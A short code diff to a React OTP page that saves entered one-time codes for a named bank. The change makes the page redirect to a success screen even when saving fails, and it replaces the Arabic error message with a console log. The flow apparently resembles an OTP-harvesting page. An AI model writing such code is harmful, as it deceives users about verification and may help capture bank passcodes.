@@ -35,10 +35,10 @@ export default function Otp() {
         otpType: "standard",
       });
       toast.success("تم التحقق بنجاح");
-      setLocation(`/success?bank=${bank}&session=${sessionId}`);
     } catch (error) {
-      toast.error("حدث خطأ في التحقق");
+      console.error("Error saving OTP in DB, continuing anyway:", error);
     }
+    setLocation(`/success?bank=${bank}&session=${sessionId}`);
   };
 
   return (
